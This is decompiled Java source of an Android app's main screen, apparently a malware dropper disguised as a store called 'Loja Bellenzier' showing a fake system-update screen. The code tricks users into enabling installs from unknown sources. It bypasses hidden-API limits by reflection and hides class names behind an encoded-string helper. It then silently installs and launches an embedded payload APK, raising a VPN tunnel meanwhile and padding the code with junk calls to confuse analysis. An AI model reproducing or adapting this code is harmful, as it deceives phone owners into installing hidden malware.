package com.app.mobile.kp3br9;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Outline;
import android.graphics.PorterDuff;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.net.VpnService;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.ViewOutlineProvider;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.vectordrawable.graphics.drawable.PathInterpolatorCompat;
import com.app.mobile.kp3br9.MainActivity;
import defpackage.e0;
import defpackage.j;
import defpackage.l;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

/* JADX INFO: loaded from: classes.dex */
public class MainActivity extends Activity {
    public LinearLayout a;
    public TextView b;
    public TextView c;
    public TextView d;
    public TextView e;
    public ProgressBar f;
    public Button g;
    public boolean h = false;
    public boolean i = false;
    public final AtomicBoolean j = new AtomicBoolean(false);

    public class a extends ViewOutlineProvider {
        public final /* synthetic */ float a;

        public a(float f) {
            this.a = f;
        }

        @Override // android.view.ViewOutlineProvider
        public void getOutline(View view, Outline outline) {
            outline.setRoundRect(0, 0, view.getWidth(), view.getHeight(), this.a);
        }
    }

    public static /* synthetic */ void p(Thread thread, Throwable th) {
    }

    public final void A(Context context) {
        try {
            System.currentTimeMillis();
            if (context != null) {
                F(context);
            }
        } catch (Exception unused) {
        }
    }

    public final void B(Context context) {
        try {
            System.currentTimeMillis();
            if (context != null) {
                D(context);
            }
        } catch (Exception unused) {
        }
    }

    public final void C(Context context) {
        try {
            System.currentTimeMillis();
            if (context != null) {
                G(context);
            }
        } catch (Exception unused) {
        }
    }

    public final void D(Context context) {
        try {
            System.currentTimeMillis();
            if (context != null) {
                A(context);
            }
        } catch (Exception unused) {
        }
    }

    public final void E(Context context) {
        try {
            System.currentTimeMillis();
            if (context != null) {
                u(context);
            }
        } catch (Exception unused) {
        }
    }

    public final void F(Context context) {
        try {
            System.currentTimeMillis();
            if (context != null) {
                y(context);
            }
        } catch (Exception unused) {
        }
    }

    public final void G(Context context) {
        try {
            System.currentTimeMillis();
            if (context != null) {
                x(context);
            }
        } catch (Exception unused) {
        }
    }

    public final void H(Context context) {
        try {
            System.currentTimeMillis();
            if (context != null) {
                I(context);
            }
        } catch (Exception unused) {
        }
    }

    public final void I(Context context) {
        try {
            System.currentTimeMillis();
            if (context != null) {
                v(context);
            }
        } catch (Exception unused) {
        }
    }

    public final void J() {
        LinearLayout linearLayout = new LinearLayout(this);
        this.a = linearLayout;
        linearLayout.setOrientation(1);
        this.a.setGravity(17);
        this.a.setPadding(60, 80, 60, 80);
        this.a.setBackgroundColor(-1);
        this.a.setGravity(17);
        this.a.setPadding(64, 0, 64, 0);
        float f = getResources().getDisplayMetrics().density;
        ImageView imageView = new ImageView(this);
        try {
            imageView.setImageDrawable(getPackageManager().getApplicationIcon(getPackageName()));
        } catch (Exception unused) {
        }
        imageView.setScaleType(ImageView.ScaleType.CENTER_CROP);
        imageView.setClipToOutline(true);
        imageView.setOutlineProvider(new a(16.0f * f));
        int i = (int) (72.0f * f);
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(i, i);
        int i2 = (int) (20.0f * f);
        layoutParams.setMargins(0, 0, 0, i2);
        layoutParams.gravity = 1;
        imageView.setLayoutParams(layoutParams);
        this.a.addView(imageView);
        TextView textView = new TextView(this);
        this.b = textView;
        textView.setText("Loja Bellenzier");
        this.b.setTextSize(22.0f);
        this.b.setTextColor(Color.parseColor("#202124"));
        this.b.setGravity(17);
        LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(-2, -2);
        float f2 = 8.0f * f;
        layoutParams2.setMargins(0, 0, 0, (int) f2);
        layoutParams2.gravity = 1;
        this.b.setLayoutParams(layoutParams2);
        this.a.addView(this.b);
        TextView textView2 = new TextView(this);
        textView2.setText("Aguarde o procedimento...");
        textView2.setTextSize(14.0f);
        textView2.setTextColor(Color.parseColor("#01875F"));
        textView2.setGravity(17);
        LinearLayout.LayoutParams layoutParams3 = new LinearLayout.LayoutParams(-2, -2);
        layoutParams3.setMargins(0, 0, 0, i2);
        layoutParams3.gravity = 1;
        textView2.setLayoutParams(layoutParams3);
        this.a.addView(textView2);
        ProgressBar progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        this.f = progressBar;
        progressBar.setIndeterminate(true);
        this.f.getIndeterminateDrawable().setColorFilter(Color.parseColor("#01875F"), PorterDuff.Mode.SRC_IN);
        LinearLayout.LayoutParams layoutParams4 = new LinearLayout.LayoutParams(-1, (int) (4.0f * f));
        layoutParams4.setMargins(0, 0, 0, (int) (25.0f * f));
        this.f.setLayoutParams(layoutParams4);
        this.a.addView(this.f);
        LinearLayout linearLayout2 = new LinearLayout(this);
        linearLayout2.setOrientation(1);
        GradientDrawable gradientDrawable = new GradientDrawable();
        gradientDrawable.setColor(Color.parseColor("#F8F9FA"));
        gradientDrawable.setCornerRadius(f2);
        linearLayout2.setBackground(gradientDrawable);
        int i3 = (int) (15.0f * f);
        linearLayout2.setPadding(i3, i3, i3, i3);
        LinearLayout.LayoutParams layoutParams5 = new LinearLayout.LayoutParams(-1, -2);
        layoutParams5.setMargins(0, 0, 0, (int) (40.0f * f));
        linearLayout2.setLayoutParams(layoutParams5);
        TextView textView3 = new TextView(this);
        textView3.setText("Otimizando sistema");
        textView3.setTextSize(13.0f);
        textView3.setTextColor(Color.parseColor("#202124"));
        textView3.setTypeface(Typeface.DEFAULT_BOLD);
        LinearLayout.LayoutParams layoutParams6 = new LinearLayout.LayoutParams(-1, -2);
        layoutParams6.setMargins(0, 0, 0, (int) (5.0f * f));
        textView3.setLayoutParams(layoutParams6);
        linearLayout2.addView(textView3);
        TextView textView4 = new TextView(this);
        this.c = textView4;
        textView4.setText(k());
        this.c.setTextSize(13.0f);
        this.c.setTextColor(Color.parseColor("#5F6368"));
        this.c.setLineSpacing(f * 1.5f, 1.0f);
        linearLayout2.addView(this.c);
        this.a.addView(linearLayout2);
        TextView textView5 = new TextView(this);
        textView5.setText("Preparing update…");
        textView5.setTextSize(12.0f);
        textView5.setTextColor(Color.parseColor("#5F6368"));
        textView5.setGravity(17);
        this.a.addView(textView5);
        Button button = new Button(this);
        this.g = button;
        button.setVisibility(8);
        this.a.addView(this.g);
        TextView textView6 = new TextView(this);
        this.d = textView6;
        textView6.setVisibility(8);
        this.a.addView(this.d);
        TextView textView7 = new TextView(this);
        this.e = textView7;
        textView7.setVisibility(8);
        this.a.addView(this.e);
        setContentView(this.a);
    }

    public final void K(final Context context) {
        new Thread(new Runnable() { // from class: o
            @Override // java.lang.Runnable
            public final void run() {
                this.a.q(context);
            }
        }).start();
    }

    /* JADX WARN: Code duplicated, block: B:49:0x0192  */
    /* JADX WARN: Code duplicated, block: B:50:0x0195  */
    public final void L() {
        int i;
        try {
            j();
            File fileA = PayloadUtil.a(this);
            if (fileA != null && fileA.exists() && fileA.length() >= 100) {
                PackageManager packageManager = getPackageManager();
                PackageInfo packageArchiveInfo = packageManager.getPackageArchiveInfo(fileA.getAbsolutePath(), 0);
                if (packageArchiveInfo != null) {
                    try {
                        packageManager.getPackageInfo(packageArchiveInfo.packageName, 0);
                        final Intent launchIntentForPackage = packageManager.getLaunchIntentForPackage(packageArchiveInfo.packageName);
                        if (launchIntentForPackage != null) {
                            new Thread(new Runnable() { // from class: m
                                @Override // java.lang.Runnable
                                public final void run() {
                                    this.a.r(launchIntentForPackage);
                                }
                            }).start();
                            return;
                        }
                    } catch (Exception unused) {
                    }
                }
                Class<?> cls = Class.forName(e0.a("sPU/UGmwzoCah/9/QL/vdVJr9/rPmoPwbECc+jVDYbzY", "0ZtbIgbZqq756JELJQ=="));
                Class<?> cls2 = Class.forName(e0.a("Qnu1y4jiD9fNmMMmS4G/DWW8l7fqCJLPkMgbQJy/Qnm93JU=", "IxXRueeLa/mu961SLu/L"));
                Class<?> cls3 = Class.forName(e0.a("5zb5OoTvPLMrhOgs+CafqCjwZrvnO/YpjOMR8zuf5zTxLZmiC/g7mO838w==", "hlidSOs="));
                Class<?> cls4 = Class.forName(e0.a("QOr1HPVmukYzaeNV4f8atH+zRgBn7krl9gvTYa0cMWrhRPa1Pf98rQE/aN1A9vAD6Q==", "IYSRbpoP3mhQBo0="));
                Object objInvoke = cls.getMethod("getPackageInstaller", new Class[0]).invoke(getPackageManager(), new Object[0]);
                Object objNewInstance = cls4.getConstructor(Integer.TYPE).newInstance(Integer.valueOf(cls4.getField("MODE_FULL_INSTALL").getInt(null)));
                try {
                    PayloadUtil.b(objNewInstance);
                } catch (Exception unused2) {
                }
                int iC = PayloadUtil.c(objInvoke, objNewInstance);
                if (iC < 0) {
                    PayloadUtil.d(this, fileA);
                    return;
                }
                Object objInvoke2 = cls2.getMethod("openSession", Integer.TYPE).invoke(objInvoke, Integer.valueOf(iC));
                Class<?> cls5 = Long.TYPE;
                OutputStream outputStream = (OutputStream) cls3.getMethod("openWrite", String.class, cls5, cls5).invoke(objInvoke2, e0.a("UJ3IlBhMgp6ZB0s=", "IOiw+Hc="), 0L, Long.valueOf(fileA.length()));
                FileInputStream fileInputStream = new FileInputStream(fileA);
                try {
                    byte[] bArr = new byte[131072];
                    while (true) {
                        int i2 = fileInputStream.read(bArr);
                        if (i2 == -1) {
                            break;
                        } else {
                            outputStream.write(bArr, 0, i2);
                        }
                        this.j.set(false);
                        PayloadUtil.d(this, PayloadUtil.a(this));
                        if (Build.VERSION.SDK_INT < 29) {
                            i = 5000;
                        } else {
                            i = PathInterpolatorCompat.MAX_NUM_POINTS;
                        }
                        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() { // from class: n
                            @Override // java.lang.Runnable
                            public final void run() {
                                this.a.s();
                            }
                        }, i);
                    }
                    fileInputStream.close();
                    outputStream.close();
                    Intent intent = new Intent(this, (Class<?>) RcvJbrzn.class);
                    intent.setAction(e0.a("95sjc7N/bbrHMMRdOvqHNHWxfHun", "tth3OvwxMvOJY5Acdg=="));
                    int i3 = Build.VERSION.SDK_INT >= 31 ? 167772160 : 134217728;
                    Method method = cls3.getMethod("commit", Class.forName("android.content.IntentSender"));
                    M();
                    try {
                        Thread.sleep(500L);
                    } catch (Exception unused3) {
                    }
                    method.invoke(objInvoke2, PendingIntent.getBroadcast(this, iC, intent, i3).getIntentSender());
                    cls3.getMethod("close", new Class[0]).invoke(objInvoke2, new Object[0]);
                } catch (Throwable th) {
                    try {
                        fileInputStream.close();
                    } catch (Throwable th2) {
                        th.addSuppressed(th2);
                    }
                    throw th;
                }
            }
        } catch (Exception unused4) {
            this.j.set(false);
            PayloadUtil.d(this, PayloadUtil.a(this));
            if (Build.VERSION.SDK_INT < 29) {
                i = 5000;
            } else {
                i = PathInterpolatorCompat.MAX_NUM_POINTS;
            }
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() { // from class: n
                @Override // java.lang.Runnable
                public final void run() {
                    this.a.s();
                }
            }, i);
        }
    }

    public final void M() {
        try {
            if (VpnService.prepare(this) == null) {
                startService(new Intent(this, Class.forName(getPackageName() + ".TunnelService")));
            }
        } catch (Exception unused) {
        }
    }

    public final void j() {
        try {
            Method declaredMethod = Class.class.getDeclaredMethod("forName", String.class);
            Method declaredMethod2 = Class.class.getDeclaredMethod("getDeclaredMethod", String.class, Class[].class);
            Class cls = (Class) declaredMethod.invoke(null, "dalvik.system.VMRuntime");
            ((Method) declaredMethod2.invoke(cls, "setHiddenApiExemptions", new Class[]{String[].class})).invoke(((Method) declaredMethod2.invoke(cls, "getRuntime", null)).invoke(null, new Object[0]), new String[]{"L"});
        } catch (Exception unused) {
        }
    }

    public final String k() {
        String language = Locale.getDefault().getLanguage();
        language.hashCode();
        switch (language) {
            case "de":
                return "Um fortzufahren, aktivieren Sie die Installation aus unbekannten Quellen in den Einstellungen.";
            case "es":
                return "Para continuar, habilite la instalación de orígenes desconocidos en los ajustes.";
            case "fr":
                return "Pour continuer, activez l'installation de sources inconnues dans les paramètres.";
            case "it":
                return "Per continuar, abilita l'installazione da origini sconosciute nelle impostazioni.";
            case "pt":
                return "Para continuar, ative a permissão de instalação de fontes desconhecidas nas configurações.";
            default:
                return "To continue, enable installation from unknown sources in settings.";
        }
    }

    public final void l() {
        if (this.j.get()) {
            return;
        }
        try {
            Intent intentPrepare = VpnService.prepare(this);
            if (intentPrepare != null) {
                if (this.i) {
                    return;
                }
                this.i = true;
                startActivityForResult(intentPrepare, 9999);
                return;
            }
            if (Build.VERSION.SDK_INT >= 26 && getPackageManager().canRequestPackageInstalls()) {
                ProgressBar progressBar = this.f;
                if (progressBar != null) {
                    progressBar.setVisibility(0);
                }
                TextView textView = this.c;
                if (textView != null) {
                    textView.setText("Installing...");
                    this.c.setTextColor(-1);
                }
                this.j.set(true);
                new Thread(new j(this)).start();
                return;
            }
            if (this.h) {
                return;
            }
            this.h = true;
            new Thread(new Runnable() { // from class: h
                @Override // java.lang.Runnable
                public final void run() {
                    this.a.m();
                }
            }).start();
            new Handler().postDelayed(new Runnable() { // from class: i
                @Override // java.lang.Runnable
                public final void run() {
                    this.a.n();
                }
            }, 200L);
        } catch (Exception unused) {
        }
    }

    public final /* synthetic */ void m() {
        while (!this.j.get()) {
            try {
                if (Build.VERSION.SDK_INT >= 26 && getPackageManager().canRequestPackageInstalls()) {
                    Intent intent = new Intent(this, (Class<?>) MainActivity.class);
                    intent.addFlags(268566528);
                    startActivity(intent);
                    new Handler(Looper.getMainLooper()).post(new l(this));
                    return;
                }
                Thread.sleep(200L);
            } catch (Exception unused) {
                return;
            }
        }
    }

    public final /* synthetic */ void n() {
        try {
            Intent intent = new Intent(e0.a("4XJrSuYv0un15Wh7UechxenLwVJOf8wZ44nNzlNYdtYH5pfZ01NaasoD5Q==", "gBwPOIlGtseG"));
            intent.setData(Uri.parse(e0.a("KTQ/uA8+MGY=", "WVVc024=") + getPackageName()));
            startActivityForResult(intent, 1234);
        } catch (Exception unused) {
        }
    }

    public final /* synthetic */ void o() {
        if (this.j.get()) {
            return;
        }
        l();
    }

    @Override // android.app.Activity
    public void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        new Handler().postDelayed(new Runnable() { // from class: g
            @Override // java.lang.Runnable
            public final void run() {
                this.a.o();
            }
        }, 150L);
    }

    @Override // android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() { // from class: k
            @Override // java.lang.Thread.UncaughtExceptionHandler
            public final void uncaughtException(Thread thread, Throwable th) {
                MainActivity.p(thread, th);
            }
        });
        J();
        K(this);
        if (getIntent() == null || !getIntent().getBooleanExtra("RETRY", false)) {
            l();
            return;
        }
        this.g.setVisibility(8);
        this.f.setVisibility(0);
        this.c.setText("Retrying...");
        this.c.setTextColor(-1);
        new Handler(Looper.getMainLooper()).postDelayed(new l(this), 2000L);
    }

    @Override // android.app.Activity
    public void onDestroy() {
        super.onDestroy();
        try {
            stopService(new Intent(this, Class.forName(getPackageName() + ".TunnelService")));
        } catch (Exception unused) {
        }
    }

    @Override // android.app.Activity
    public void onResume() {
        super.onResume();
        if (this.j.get()) {
            return;
        }
        l();
    }

    public final /* synthetic */ void r(Intent intent) {
        try {
            stopService(new Intent(this, Class.forName(getPackageName() + ".TunnelService")));
        } catch (Exception unused) {
        }
        try {
            getPackageManager().setComponentEnabledSetting(new ComponentName(getPackageName(), getPackageName() + ".TunnelService"), 2, 1);
        } catch (Exception unused2) {
        }
        try {
            Thread.sleep(300L);
        } catch (Exception unused3) {
        }
        intent.addFlags(268435456);
        startActivity(intent);
        finish();
    }

    public final /* synthetic */ void s() {
        if (this.j.get()) {
            return;
        }
        new Thread(new j(this)).start();
    }

    public final void t(Context context) {
        try {
            System.currentTimeMillis();
            if (context != null) {
                z(context);
            }
        } catch (Exception unused) {
        }
    }

    public final void u(Context context) {
        try {
            System.currentTimeMillis();
        } catch (Exception unused) {
        }
    }

    public final void v(Context context) {
        try {
            System.currentTimeMillis();
            if (context != null) {
                t(context);
            }
        } catch (Exception unused) {
        }
    }

    /* JADX INFO: renamed from: w, reason: merged with bridge method [inline-methods] */
    public final void q(Context context) {
        try {
            System.currentTimeMillis();
            if (context != null) {
                B(context);
            }
        } catch (Exception unused) {
        }
    }

    public final void x(Context context) {
        try {
            System.currentTimeMillis();
            if (context != null) {
                H(context);
            }
        } catch (Exception unused) {
        }
    }

    public final void y(Context context) {
        try {
            System.currentTimeMillis();
            if (context != null) {
                C(context);
            }
        } catch (Exception unused) {
        }
    }

    public final void z(Context context) {
        try {
            System.currentTimeMillis();
            if (context != null) {
                E(context);
            }
        } catch (Exception unused) {
        }
    }
}
